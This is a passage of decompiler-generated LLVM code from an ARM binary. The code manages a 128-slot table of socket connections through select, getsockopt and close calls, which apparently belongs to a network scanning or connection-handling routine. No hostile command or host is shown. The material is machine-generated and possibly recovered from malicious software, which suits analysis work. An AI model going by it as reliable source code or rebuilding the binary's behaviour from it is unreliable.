  store i32 %v2_12064, i32* %r2.global-to-local, align 4
  %v1_12068 = and i32 %v2_12064, 128
  %v2_12068 = icmp ne i32 %v1_12068, 0
  store i1 %v2_12068, i1* %cpsr_c.global-to-local, align 1
  %v3_12068 = sdiv i32 %v2_12064, 256
  store i32 %v3_12068, i32* %r3.global-to-local, align 4
  %v1_1206c = trunc i32 %v3_12068 to i8
  %v2_1206c = load i32, i32* @r0, align 4
  %v3_1206c = add i32 %v2_1206c, 21
  %v4_1206c = inttoptr i32 %v3_1206c to i8*
  store i8 %v1_1206c, i8* %v4_1206c, align 1
  %v0_12070 = load i32, i32* %r2.global-to-local, align 4
  %v1_12070 = trunc i32 %v0_12070 to i8
  %v2_12070 = load i32, i32* @r0, align 4
  %v3_12070 = add i32 %v2_12070, 20
  %v4_12070 = inttoptr i32 %v3_12070 to i8*
  store i8 %v1_12070, i8* %v4_12070, align 1
  %v0_12074 = call i32 @function_113ac()
  store i32 %v0_12074, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_11edc

dec_label_pc_1207c:                               ; preds = %dec_label_pc_11700
  store i32 ptrtoint (i32* @global_var_1cd68.253 to i32), i32* %r2.global-to-local, align 4
  %v2_12080 = load i32, i32* @global_var_1cd68.253, align 4
  store i32 %v2_12080, i32* %r0.global-to-local, align 4
  %v1_12084 = call i32 @close(i32 %v2_12080)
  store i32 %v1_12084, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_12088

dec_label_pc_12088:                               ; preds = %dec_label_pc_116d8, %dec_label_pc_1207c
  %v0_12088 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_12088, i32* %r0.global-to-local, align 4
  call void @exit(i32 %v0_12088)
  unreachable

dec_label_pc_12090.loopexit:                      ; preds = %dec_label_pc_1203c
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_12090

dec_label_pc_12090:                               ; preds = %dec_label_pc_1200c, %dec_label_pc_11f18, %dec_label_pc_11edc, %dec_label_pc_12090.loopexit
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  store i32 1672, i32* %ip.global-to-local, align 4
  %v2_120a8409 = load i32, i32* @sp, align 4
  %v3_120a8410 = add i32 %v2_120a8409, 1672
  %v4_120a8411 = inttoptr i32 %v3_120a8410 to i32*
  store i32 0, i32* %v4_120a8411, align 4
  br label %dec_label_pc_12098.dec_label_pc_12098_crit_edge

dec_label_pc_12098.dec_label_pc_12098_crit_edge:  ; preds = %dec_label_pc_12090, %dec_label_pc_12098.dec_label_pc_12098_crit_edge
  %v0_12098.pre = load i32, i32* %r3.global-to-local, align 4
  %v0_120a8.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_1209c = add i32 %v0_12098.pre, 4
  store i32 %v1_1209c, i32* %r3.global-to-local, align 4
  %v1_120a0 = add i32 %v0_12098.pre, 1672
  store i32 %v1_120a0, i32* %ip.global-to-local, align 4
  %v7_120a4 = icmp eq i32 %v1_1209c, 128
  %v2_120a8 = load i32, i32* @sp, align 4
  %v3_120a8 = add i32 %v2_120a8, %v1_120a0
  %v4_120a8 = inttoptr i32 %v3_120a8 to i32*
  store i32 %v0_120a8.pre, i32* %v4_120a8, align 4
  br i1 %v7_120a4, label %dec_label_pc_120b0, label %dec_label_pc_12098.dec_label_pc_12098_crit_edge

dec_label_pc_120b0:                               ; preds = %dec_label_pc_12098.dec_label_pc_12098_crit_edge
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  %v0_120b0 = load i32, i32* %r2.global-to-local, align 4
  %v1_120b8412 = add i32 %v0_120b0, 4
  store i32 %v1_120b8412, i32* %r3.global-to-local, align 4
  %v1_120bc413 = add i32 %v0_120b0, 1544
  store i32 %v1_120bc413, i32* %lr.global-to-local, align 4
  %v7_120c0414 = icmp eq i32 %v1_120b8412, 128
  %v2_120c4415 = load i32, i32* @sp, align 4
  %v3_120c4416 = add i32 %v2_120c4415, %v1_120bc413
  %v4_120c4417 = inttoptr i32 %v3_120c4416 to i32*
  store i32 %v0_120b0, i32* %v4_120c4417, align 4
  br i1 %v7_120c0414, label %dec_label_pc_120cc, label %dec_label_pc_120b4.dec_label_pc_120b4_crit_edge

dec_label_pc_120b4.dec_label_pc_120b4_crit_edge:  ; preds = %dec_label_pc_120b0, %dec_label_pc_120b4.dec_label_pc_120b4_crit_edge
  %v0_120b4.pre = load i32, i32* %r3.global-to-local, align 4
  %v0_120c4.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_120b8 = add i32 %v0_120b4.pre, 4
  store i32 %v1_120b8, i32* %r3.global-to-local, align 4
  %v1_120bc = add i32 %v0_120b4.pre, 1544
  store i32 %v1_120bc, i32* %lr.global-to-local, align 4
  %v7_120c0 = icmp eq i32 %v1_120b8, 128
  %v2_120c4 = load i32, i32* @sp, align 4
  %v3_120c4 = add i32 %v2_120c4, %v1_120bc
  %v4_120c4 = inttoptr i32 %v3_120c4 to i32*
  store i32 %v0_120c4.pre, i32* %v4_120c4, align 4
  br i1 %v7_120c0, label %dec_label_pc_120cc, label %dec_label_pc_120b4.dec_label_pc_120b4_crit_edge

dec_label_pc_120cc:                               ; preds = %dec_label_pc_120b4.dec_label_pc_120b4_crit_edge, %dec_label_pc_120b0
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  %v0_120cc = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_120cc, i32* @r6, align 4
  store i32 %v0_120cc, i32* @r5, align 4
  store i32 %v0_120cc, i32* @r7, align 4
  store i32 %v0_120cc, i32* %stack_var_-52, align 4
  br label %dec_label_pc_12144

dec_label_pc_120e0:                               ; preds = %dec_label_pc_1216c, %dec_label_pc_12144
  %storemerge223 = phi i32 [ 30, %dec_label_pc_12144 ], [ 5, %dec_label_pc_1216c ]
  store i32 %storemerge223, i32* %r1.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1cd44.239 to i32), i32* %r2.global-to-local, align 4
  %v2_120e4 = load i32, i32* @global_var_1cd44.239, align 4
  store i32 %v2_120e4, i32* %r3.global-to-local, align 4
  %v1_120e8 = add i32 %v2_12158, 8
  %v2_120e8 = inttoptr i32 %v1_120e8 to i32*
  %v3_120e8 = load i32, i32* %v2_120e8, align 4
  store i32 %v3_120e8, i32* %r2.global-to-local, align 4
  %v2_120ec = sub i32 %v2_120e4, %v3_120e8
  store i32 %v2_120ec, i32* %r3.global-to-local, align 4
  %v3_120f0 = icmp uge i32 %v2_120ec, %storemerge223
  store i1 %v3_120f0, i1* %cpsr_c.global-to-local, align 1
  %v9_120f0 = icmp eq i32 %v2_120ec, %storemerge223
  store i1 %v9_120f0, i1* %cpsr_z.global-to-local, align 1
  %v2_120f4 = xor i1 %v9_120f0, true
  %v3_120f4 = and i1 %v3_120f0, %v2_120f4
  br i1 %v3_120f4, label %dec_label_pc_121ac, label %dec_label_pc_120f8

dec_label_pc_120f8:                               ; preds = %dec_label_pc_120e0
  store i1 %v2_12160, i1* %cpsr_c.global-to-local, align 1
  store i1 %v7_12160, i1* %cpsr_z.global-to-local, align 1
  %v1_1217c = add i32 %v2_12158, 4
  %v2_1217c = inttoptr i32 %v1_1217c to i32*
  %v3_1217c = load i32, i32* %v2_1217c, align 4
  br i1 %v7_12160, label %dec_label_pc_1217c, label %dec_label_pc_12100

dec_label_pc_12100:                               ; preds = %dec_label_pc_120f8
  store i32 %v3_1217c, i32* %ip.global-to-local, align 4
  %v3_12104 = udiv i32 %v3_1217c, 32
  store i32 %v2_12188, i32* %r0.global-to-local, align 4
  %v3_1210c = mul nuw nsw i32 %v3_12104, 4
  %v2_12110 = add i32 %v3_1210c, %v2_12188
  store i32 %v2_12110, i32* %r3.global-to-local, align 4
  %v1_12114 = add i32 %v2_12110, -184
  %v2_12114 = inttoptr i32 %v1_12114 to i32*
  %v3_12114 = load i32, i32* %v2_12114, align 4
  %v1_12118 = urem i32 %v3_1217c, 32
  store i32 %v1_12118, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v7_12120 = shl i32 1, %v1_12118
  %v8_12120 = or i32 %v3_12114, %v7_12120
  store i32 %v8_12120, i32* %r2.global-to-local, align 4
  store i32 %v8_12120, i32* %v2_12114, align 4
  %v0_12128 = load i32, i32* @r6, align 4
  %v1_12128 = load i32, i32* %ip.global-to-local, align 4
  %v3_12128 = icmp uge i32 %v0_12128, %v1_12128
  store i1 %v3_12128, i1* %cpsr_c.global-to-local, align 1
  %v9_12128 = icmp eq i32 %v0_12128, %v1_12128
  store i1 %v9_12128, i1* %cpsr_z.global-to-local, align 1
  %v5_1212c = icmp slt i32 %v0_12128, %v1_12128
  br i1 %v5_1212c, label %bb310, label %bb311

bb310:                                            ; preds = %dec_label_pc_12100
  store i32 %v1_12128, i32* @r6, align 4
  br label %bb311

bb311:                                            ; preds = %dec_label_pc_1216c, %dec_label_pc_12e08, %dec_label_pc_121e0, %bb313, %dec_label_pc_12100, %bb310
  %v3_12130 = load i32, i32* %stack_var_-52, align 4
  store i32 %v3_12130, i32* %r3.global-to-local, align 4
  %v1_12134 = add i32 %v3_12130, 1
  store i32 %v1_12134, i32* %r2.global-to-local, align 4
  %v2_12138 = icmp ugt i32 %v1_12134, 126
  store i1 %v2_12138, i1* %cpsr_c.global-to-local, align 1
  %v7_12138 = icmp eq i32 %v1_12134, 127
  store i1 %v7_12138, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_12134, i32* %stack_var_-52, align 4
  %v8_12140 = icmp sgt i32 %v1_12134, 127
  br i1 %v8_12140, label %dec_label_pc_121ec, label %dec_label_pc_12144

dec_label_pc_12144:                               ; preds = %bb311, %dec_label_pc_120cc
  %v0_12150 = phi i32 [ %v1_12134, %bb311 ], [ %v0_120cc, %dec_label_pc_120cc ]
  store i32 ptrtoint (i32* @global_var_1cd64.251 to i32), i32* %r0.global-to-local, align 4
  %v3_12148 = mul i32 %v0_12150, 256
  store i32 %v3_12148, i32* %r3.global-to-local, align 4
  %v2_1214c = load i32, i32* @global_var_1cd64.251, align 4
  store i32 %v2_1214c, i32* %r1.global-to-local, align 4
  %v2_12154 = mul i32 %v0_12150, 288
  store i32 %v2_12154, i32* %r2.global-to-local, align 4
  %v2_12158 = add i32 %v2_1214c, %v2_12154
  store i32 %v2_12158, i32* @r4, align 4
  %v1_1215c = add i32 %v2_12158, 12
  %v2_1215c = inttoptr i32 %v1_1215c to i32*
  %v3_1215c = load i32, i32* %v2_1215c, align 4
  store i32 %v3_1215c, i32* %ip.global-to-local, align 4
  %v2_12160 = icmp ne i32 %v3_1215c, 0
  store i1 %v2_12160, i1* %cpsr_c.global-to-local, align 1
  %v7_12160 = icmp eq i32 %v3_1215c, 1
  store i1 %v7_12160, i1* %cpsr_z.global-to-local, align 1
  %v2_12164 = xor i1 %v7_12160, true
  %v3_12164 = and i1 %v2_12160, %v2_12164
  br i1 %v3_12164, label %dec_label_pc_120e0, label %dec_label_pc_1216c

dec_label_pc_1216c:                               ; preds = %dec_label_pc_12144
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1216c = icmp eq i32 %v3_1215c, 0
  store i1 %v2_1216c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1216c, label %bb311, label %dec_label_pc_120e0

dec_label_pc_1217c:                               ; preds = %dec_label_pc_120f8
  store i32 %v3_1217c, i32* %r0.global-to-local, align 4
  %v3_12180 = udiv i32 %v3_1217c, 32
  %v3_12184 = mul nuw nsw i32 %v3_12180, 4
  store i32 %v2_12188, i32* %lr.global-to-local, align 4
  %v2_1218c = add i32 %v3_12184, %v2_12188
  store i32 %v2_1218c, i32* %r3.global-to-local, align 4
  %v1_12190 = add i32 %v2_1218c, -312
  %v2_12190 = inttoptr i32 %v1_12190 to i32*
  %v3_12190 = load i32, i32* %v2_12190, align 4
  %v1_12194 = urem i32 %v3_1217c, 32
  store i32 %v1_12194, i32* %r1.global-to-local, align 4
  %v7_12198 = shl i32 1, %v1_12194
  %v8_12198 = or i32 %v3_12190, %v7_12198
  store i32 %v8_12198, i32* %r2.global-to-local, align 4
  %v0_1219c = load i32, i32* @r5, align 4
  %v3_1219c = icmp uge i32 %v0_1219c, %v3_1217c
  store i1 %v3_1219c, i1* %cpsr_c.global-to-local, align 1
  %v9_1219c = icmp eq i32 %v0_1219c, %v3_1217c
  store i1 %v9_1219c, i1* %cpsr_z.global-to-local, align 1
  %v5_121a0 = icmp slt i32 %v0_1219c, %v3_1217c
  br i1 %v5_121a0, label %bb312, label %bb313

bb312:                                            ; preds = %dec_label_pc_1217c
  store i32 %v3_1217c, i32* @r5, align 4
  br label %bb313

bb313:                                            ; preds = %dec_label_pc_1217c, %bb312
  store i32 %v8_12198, i32* %v2_12190, align 4
  br label %bb311

dec_label_pc_121ac:                               ; preds = %dec_label_pc_120e0
  %v1_121ac = add i32 %v2_12158, 4
  %v2_121ac = inttoptr i32 %v1_121ac to i32*
  %v3_121ac = load i32, i32* %v2_121ac, align 4
  store i32 %v3_121ac, i32* %r0.global-to-local, align 4
  %v1_121b0 = call i32 @close(i32 %v3_121ac)
  store i32 %v1_121b0, i32* %r0.global-to-local, align 4
  %v0_121b4 = load i32, i32* @r4, align 4
  %v1_121b4 = add i32 %v0_121b4, 12
  %v2_121b4 = inttoptr i32 %v1_121b4 to i32*
  %v3_121b4 = load i32, i32* %v2_121b4, align 4
  store i32 %v3_121b4, i32* %r3.global-to-local, align 4
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_121bc = icmp ugt i32 %v3_121b4, 1
  store i1 %v2_121bc, i1* %cpsr_c.global-to-local, align 1
  %v7_121bc = icmp eq i32 %v3_121b4, 2
  store i1 %v7_121bc, i1* %cpsr_z.global-to-local, align 1
  %v2_121c0 = add i32 %v0_121b4, 4
  %v3_121c0 = inttoptr i32 %v2_121c0 to i32*
  store i32 -1, i32* %v3_121c0, align 4
  %v2_121c4 = xor i1 %v2_121bc, true
  %v3_121c4 = or i1 %v7_121bc, %v2_121c4
  br i1 %v3_121c4, label %dec_label_pc_12e08, label %dec_label_pc_121c8

dec_label_pc_121c8:                               ; preds = %dec_label_pc_121ac
  %v0_121c8 = load i32, i32* @r4, align 4
  %v1_121c8 = add i32 %v0_121c8, 284
  %v2_121c8 = inttoptr i32 %v1_121c8 to i8*
  %v3_121c8 = load i8, i8* %v2_121c8, align 1
  %v4_121c8 = zext i8 %v3_121c8 to i32
  %v1_121cc = add nuw nsw i32 %v4_121c8, 1
  %v1_121d0 = urem i32 %v1_121cc, 256
  store i32 %v1_121d0, i32* %r3.global-to-local, align 4
  %v2_121d4 = icmp ugt i32 %v1_121d0, 9
  store i1 %v2_121d4, i1* %cpsr_c.global-to-local, align 1
  %v7_121d4 = icmp eq i32 %v1_121d0, 10
  store i1 %v7_121d4, i1* %cpsr_z.global-to-local, align 1
  %v1_121d8 = trunc i32 %v1_121cc to i8
  store i8 %v1_121d8, i8* %v2_121c8, align 1
  %v0_121dc = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_121dc, label %dec_label_pc_12e08, label %dec_label_pc_121e0

dec_label_pc_121e0:                               ; preds = %dec_label_pc_121c8
  %v0_121e0 = load i32, i32* @r4, align 4
  store i32 %v0_121e0, i32* @r0, align 4
  %v0_121e4 = call i32 @function_113ac()
  store i32 %v0_121e4, i32* %r0.global-to-local, align 4
  br label %bb311

dec_label_pc_121ec:                               ; preds = %bb311
  store i32 1, i32* %stack_var_-64, align 4
  %v0_121f4 = load i32, i32* @r6, align 4
  %v1_121f4 = load i32, i32* @r5, align 4
  %v3_121f4 = icmp uge i32 %v0_121f4, %v1_121f4
  store i1 %v3_121f4, i1* %cpsr_c.global-to-local, align 1
  %v9_121f4 = icmp eq i32 %v0_121f4, %v1_121f4
  store i1 %v9_121f4, i1* %cpsr_z.global-to-local, align 1
  %v5_121f8 = icmp slt i32 %v0_121f4, %v1_121f4
  %storemerge77 = select i1 %v5_121f8, i32 %v1_121f4, i32 %v0_121f4
  store i32 %v2_1220c, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %v2_12214, i32* %ip.global-to-local, align 4
  store i32 %v2_12218, i32* %r1.global-to-local, align 4
  %v1_1221c = add i32 %storemerge77, 1
  store i32 %v1_1221c, i32* %r0.global-to-local, align 4
  %v13_12228 = call i32 @select(i32 %v1_1221c, %_TYPEDEF_fd_set* %tmp315, %_TYPEDEF_fd_set* %tmp314, %_TYPEDEF_fd_set* null, %timeval* %tmp317)
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_12230 = call i32 @time(i32* null)
  store i32 ptrtoint (i32* @global_var_1cd44.239 to i32), i32* %lr.global-to-local, align 4
  store i32 %v2_12230, i32* @global_var_1cd44.239, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 0, i32* %stack_var_-52, align 4
  br label %dec_label_pc_12284

dec_label_pc_1224c:                               ; preds = %dec_label_pc_122a8, %dec_label_pc_12e18
  %v0_12260 = phi i32 [ %v3_1229c, %dec_label_pc_122a8 ], [ %v0_1224c.pre, %dec_label_pc_12e18 ]
  %v3_1224c = udiv i32 %v0_12260, 32
  %v3_12250 = mul nuw nsw i32 %v3_1224c, 4
  store i32 %v2_12188, i32* %lr.global-to-local, align 4
  %v2_12258 = add i32 %v3_12250, %v2_12188
  store i32 %v2_12258, i32* %r3.global-to-local, align 4
  %v1_1225c = add i32 %v2_12258, -184
  %v2_1225c = inttoptr i32 %v1_1225c to i32*
  %v3_1225c = load i32, i32* %v2_1225c, align 4
  %v1_12260 = urem i32 %v0_12260, 32
  store i32 %v1_12260, i32* %r1.global-to-local, align 4
  %v2_12264 = add nsw i32 %v1_12260, -1
  %v3_12264 = shl i32 1, %v2_12264
  %v4_12264 = and i32 %v3_12264, %v3_1225c
  %v5_12264 = icmp ne i32 %v4_12264, 0
  store i1 %v5_12264, i1* %cpsr_c.global-to-local, align 1
  %v6_12264 = lshr i32 %v3_1225c, %v1_12260
  store i32 %v6_12264, i32* %r2.global-to-local, align 4
  %v1_12268 = urem i32 %v6_12264, 2
  %v2_12268 = icmp eq i32 %v1_12268, 0
  store i1 %v2_12268, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_12268, label %dec_label_pc_12270, label %dec_label_pc_123d4.preheader

dec_label_pc_123d4.preheader:                     ; preds = %dec_label_pc_1224c
  %v0_123d4103 = load i32, i32* @r5, align 4
  %v1_123d4104 = add i32 %v0_123d4103, 12
  %v2_123d4105 = inttoptr i32 %v1_123d4104 to i32*
  %v3_123d4106 = load i32, i32* %v2_123d4105, align 4
  store i32 %v3_123d4106, i32* %r2.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_123d8102108 = icmp eq i32 %v3_123d4106, 0
  store i1 %v2_123d8102108, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_123d8102108, label %dec_label_pc_12270, label %dec_label_pc_123e0.lr.ph

dec_label_pc_12270:                               ; preds = %dec_label_pc_123d4.loopexit, %dec_label_pc_123d4.preheader, %dec_label_pc_1224c, %bb353, %dec_label_pc_12d34, %dec_label_pc_12284, %dec_label_pc_12e2c, %dec_label_pc_12d78
  %v3_12270 = load i32, i32* %stack_var_-52, align 4
  store i32 %v3_12270, i32* %r3.global-to-local, align 4
  %v1_12274 = add i32 %v3_12270, 1
  store i32 %v1_12274, i32* %r2.global-to-local, align 4
  %v2_12278 = icmp ugt i32 %v1_12274, 126
  store i1 %v2_12278, i1* %cpsr_c.global-to-local, align 1
  %v7_12278 = icmp eq i32 %v1_12274, 127
  store i1 %v7_12278, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_12274, i32* %stack_var_-52, align 4
  %v8_12280 = icmp sgt i32 %v1_12274, 127
  br i1 %v8_12280, label %dec_label_pc_11c18, label %dec_label_pc_12284

dec_label_pc_12284:                               ; preds = %dec_label_pc_12270, %dec_label_pc_121ec
  %v0_12290 = phi i32 [ %v1_12274, %dec_label_pc_12270 ], [ 0, %dec_label_pc_121ec ]
  store i32 ptrtoint (i32* @global_var_1cd64.251 to i32), i32* %ip.global-to-local, align 4
  %v3_12288 = mul i32 %v0_12290, 256
  store i32 %v3_12288, i32* %r3.global-to-local, align 4
  %v2_1228c = load i32, i32* @global_var_1cd64.251, align 4
  store i32 %v2_1228c, i32* %r1.global-to-local, align 4
  %v2_12294 = mul i32 %v0_12290, 288
  store i32 %v2_12294, i32* %r2.global-to-local, align 4
  %v2_12298 = add i32 %v2_1228c, %v2_12294
  store i32 %v2_12298, i32* @r5, align 4
  %v1_1229c = add i32 %v2_12298, 4
  %v2_1229c = inttoptr i32 %v1_1229c to i32*
  %v3_1229c = load i32, i32* %v2_1229c, align 4
  store i32 %v3_1229c, i32* %r4.global-to-local, align 4
  %v2_122a0 = icmp eq i32 %v3_1229c, -1
  store i1 %v2_122a0, i1* %cpsr_c.global-to-local, align 1
  %v7_122a0 = icmp eq i32 %v3_1229c, -1
  store i1 %v7_122a0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_122a0, label %dec_label_pc_12270, label %dec_label_pc_122a8

dec_label_pc_122a8:                               ; preds = %dec_label_pc_12284
  %v3_122a8 = udiv i32 %v3_1229c, 32
  %v3_122ac = mul nuw nsw i32 %v3_122a8, 4
  store i32 %v2_12188, i32* %lr.global-to-local, align 4
  %v2_122b4 = add i32 %v3_122ac, %v2_12188
  store i32 %v2_122b4, i32* %r3.global-to-local, align 4
  %v1_122b8 = add i32 %v2_122b4, -312
  %v2_122b8 = inttoptr i32 %v1_122b8 to i32*
  %v3_122b8 = load i32, i32* %v2_122b8, align 4
  %v1_122bc = urem i32 %v3_1229c, 32
  store i32 %v1_122bc, i32* %r1.global-to-local, align 4
  %v2_122c0 = add nsw i32 %v1_122bc, -1
  %v3_122c0 = shl i32 1, %v2_122c0
  %v4_122c0 = and i32 %v3_122b8, %v3_122c0
  %v5_122c0 = icmp ne i32 %v4_122c0, 0
  store i1 %v5_122c0, i1* %cpsr_c.global-to-local, align 1
  %v6_122c0 = lshr i32 %v3_122b8, %v1_122bc
  store i32 %v6_122c0, i32* %r2.global-to-local, align 4
  %v1_122c4 = urem i32 %v6_122c0, 2
  %v2_122c4 = icmp eq i32 %v1_122c4, 0
  store i1 %v2_122c4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_122c4, label %dec_label_pc_1224c, label %dec_label_pc_122cc

dec_label_pc_122cc:                               ; preds = %dec_label_pc_122a8
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 4, i32* %stack_var_-56, align 4
  store i32 %v2_128bc, i32* %r3.global-to-local, align 4
  store i32 %v2_12808, i32* %ip.global-to-local, align 4
  store i32 %v3_1229c, i32* %r0.global-to-local, align 4
  store i32 0, i32* @r6, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 0, i32* %stack_var_-48, align 4
  %v8_122fc = call i32 @getsockopt(i32 %v3_1229c, i32 1, i32 4, i32* nonnull %stack_var_-48, i32* nonnull %stack_var_-56)
  %v3_12300 = load i32, i32* %stack_var_-48, align 4
  store i32 %v3_12300, i32* %r3.global-to-local, align 4
  %v2_12304 = or i32 %v3_12300, %v8_122fc
  store i32 %v2_12304, i32* %r0.global-to-local, align 4
  %v4_12304 = icmp eq i32 %v2_12304, 0
  store i1 %v4_12304, i1* %cpsr_z.global-to-local, align 1
  br i1 %v4_12304, label %dec_label_pc_1230c, label %dec_label_pc_12e2c

dec_label_pc_1230c:                               ; preds = %dec_label_pc_122cc
  store i32 2, i32* %r2.global-to-local, align 4
  %v1_12310 = load i32, i32* @r5, align 4
  %v2_12310 = add i32 %v1_12310, 12
  %v3_12310 = inttoptr i32 %v2_12310 to i32*
  store i32 2, i32* %v3_12310, align 4
  %v0_12314 = call i32 @function_10b68()
  %v3_1231c = load i8, i8* @global_var_1cd41.246, align 1
  %v4_1231c = zext i8 %v3_1231c to i32
  store i32 %v4_1231c, i32* %r2.global-to-local, align 4
  %v2_12320 = load i8, i8* bitcast (i8** @global_var_1cd40.245 to i8*), align 4
  %v3_12320 = zext i8 %v2_12320 to i32
  %v4_12324 = mul nuw nsw i32 %v4_1231c, 256
  %v5_12324 = or i32 %v3_12320, %v4_12324
  store i32 %v5_12324, i32* %r1.global-to-local, align 4
  %v2_12328 = urem i32 %v0_12314, %v5_12324
  store i32 ptrtoint (i32* @global_var_1cd10.241 to i32), i32* %r3.global-to-local, align 4
  %v2_12330 = load i32, i32* @global_var_1cd10.241, align 4
  store i32 %v2_12330, i32* %lr.global-to-local, align 4
  %v1_12338 = load i32, i32* @r6, align 4
  %v9_12338 = icmp eq i32 %v2_12330, %v1_12338
  store i1 %v9_12338, i1* %cpsr_z.global-to-local, align 1
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  store i32 %v2_12328, i32* %r0.global-to-local, align 4
  %v7_12340 = icmp sgt i32 %v2_12330, %v1_12338
  br i1 %v7_12340, label %dec_label_pc_12344, label %dec_label_pc_12e14

dec_label_pc_12344:                               ; preds = %dec_label_pc_1230c
  %v2_12348 = load i32, i32* @global_var_1cd3c.243, align 4
  store i32 %v2_12348, i32* %r3.global-to-local, align 4
  store i32 %v1_12338, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_12364

dec_label_pc_12354:                               ; preds = %dec_label_pc_1237c, %dec_label_pc_12364
  %v1_12354 = add i32 %v0_12354, 1
  store i32 %v1_12354, i32* %ip.global-to-local, align 4
  %v3_12358 = icmp uge i32 %v1_12354, %v2_12330
  store i1 %v3_12358, i1* %cpsr_c.global-to-local, align 1
  %v9_12358 = icmp eq i32 %v1_12354, %v2_12330
  store i1 %v9_12358, i1* %cpsr_z.global-to-local, align 1
  %v1_1235c = add i32 %v0_1235c, 16
  store i32 %v1_1235c, i32* %r3.global-to-local, align 4
  br i1 %v9_12358, label %dec_label_pc_12e14, label %dec_label_pc_12364

dec_label_pc_12364:                               ; preds = %dec_label_pc_12354, %dec_label_pc_12344
  %v0_12354 = phi i32 [ %v1_12354, %dec_label_pc_12354 ], [ %v1_12338, %dec_label_pc_12344 ]
  %v0_1235c = phi i32 [ %v1_1235c, %dec_label_pc_12354 ], [ %v2_12348, %dec_label_pc_12344 ]
  store i32 %v0_1235c, i32* %r1.global-to-local, align 4
  %v1_12368 = add i32 %v0_1235c, 9
  %v2_12368 = inttoptr i32 %v1_12368 to i8*
  %v3_12368 = load i8, i8* %v2_12368, align 1
  %v4_12368 = zext i8 %v3_12368 to i32
  store i32 %v4_12368, i32* %r2.global-to-local, align 4
  %v1_1236c = add i32 %v0_1235c, 8
  %v2_1236c = inttoptr i32 %v1_1236c to i8*
  %v3_1236c = load i8, i8* %v2_1236c, align 1
  %v4_1236c = zext i8 %v3_1236c to i32
  %v4_12370 = mul nuw nsw i32 %v4_12368, 256
  %v5_12370 = or i32 %v4_1236c, %v4_12370
  store i32 %v5_12370, i32* %r3.global-to-local, align 4
  %v3_12374 = icmp uge i32 %v5_12370, %v2_12328
  store i1 %v3_12374, i1* %cpsr_c.global-to-local, align 1
  %v9_12374 = icmp eq i32 %v5_12370, %v2_12328
  store i1 %v9_12374, i1* %cpsr_z.global-to-local, align 1
  %v2_12378 = xor i1 %v9_12374, true
  %v3_12378 = and i1 %v3_12374, %v2_12378
  br i1 %v3_12378, label %dec_label_pc_12354, label %dec_label_pc_1237c

dec_label_pc_1237c:                               ; preds = %dec_label_pc_12364
  %v1_1237c = add i32 %v0_1235c, 10
  %v2_1237c = inttoptr i32 %v1_1237c to i8*
  %v3_1237c = load i8, i8* %v2_1237c, align 1
  %v4_1237c = zext i8 %v3_1237c to i32
  store i32 %v4_1237c, i32* %r3.global-to-local, align 4
  %v1_12380 = add i32 %v0_1235c, 11
  %v2_12380 = inttoptr i32 %v1_12380 to i8*
  %v3_12380 = load i8, i8* %v2_12380, align 1
  %v4_12380 = zext i8 %v3_12380 to i32
  store i32 %v4_12380, i32* %r2.global-to-local, align 4
  %v4_12384 = mul nuw nsw i32 %v4_12380, 256
  %v5_12384 = or i32 %v4_12384, %v4_1237c
  store i32 %v5_12384, i32* %r3.global-to-local, align 4
  %v3_12388 = icmp uge i32 %v5_12384, %v2_12328
  store i1 %v3_12388, i1* %cpsr_c.global-to-local, align 1
  %v9_12388 = icmp eq i32 %v5_12384, %v2_12328
  store i1 %v9_12388, i1* %cpsr_z.global-to-local, align 1
  %v2_1238c = xor i1 %v3_12388, true
  %v3_1238c = or i1 %v9_12388, %v2_1238c
  br i1 %v3_1238c, label %dec_label_pc_12354, label %dec_label_pc_12e18

dec_label_pc_12394:                               ; preds = %dec_label_pc_125a4, %dec_label_pc_12578, %dec_label_pc_125c0
  store i32 %v3_12578, i32* %r1.global-to-local, align 4
  %v0_12398 = load i32, i32* @sb, align 4
  store i32 %v0_12398, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_1452c.378 to i32), i32* %r2.global-to-local, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  %v5_123a4 = call i32 @function_13a60(i32 %v0_12398, i32 %v3_12578, i32 ptrtoint ([5 x i8]* @global_var_1452c.378 to i32), i32 4)
  store i32 %v5_123a4, i32* %r0.global-to-local, align 4
  %v3_123a8 = icmp eq i32 %v5_123a4, -1
  store i1 %v3_123a8, i1* %cpsr_c.global-to-local, align 1
  %v8_123a8 = icmp eq i32 %v5_123a4, -1
  store i1 %v8_123a8, i1* %cpsr_z.global-to-local, align 1
  store i32 %v5_123a4, i32* @r7, align 4
